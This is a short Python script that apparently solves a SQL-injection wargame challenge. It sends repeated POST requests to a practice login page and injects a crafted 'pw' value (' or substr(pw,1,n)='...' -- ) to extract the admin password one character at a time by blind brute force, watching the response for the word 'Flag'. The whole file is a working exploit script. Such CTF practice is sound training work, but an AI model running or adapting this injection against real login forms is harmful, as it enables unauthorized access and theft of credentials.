import requests
import string

#url = 'https://p.rubiya.kr/sqli3/'
data = {
        'id': 'admin',
        'pw': ''
        }

TRUE_FLAG = 'login fail'
database_length = 5
database_name = 'sqli2'

id = 'admin'
pw_len = 25

# find pw
password = ''
list = list(string.printable)
for i in range(pw_len):
    #for current_pw in range(ord('0'), ord('z')):
    for current_pw in range(len(list)):
        url = 'https://p.rubiya.kr/sqli2/'
        data = {
            'id': 'admin',
            'pw': '\' or substr(pw,1,'+str(i+1)+')=\'' + password + str(list[current_pw])+'\' -- '
        }
        res = requests.post(url, data=data)
        print("현재 query",data)
        # print(res.text)
        if ("Flag" in res.text):
            password += str(list[current_pw])
            print(password)
            break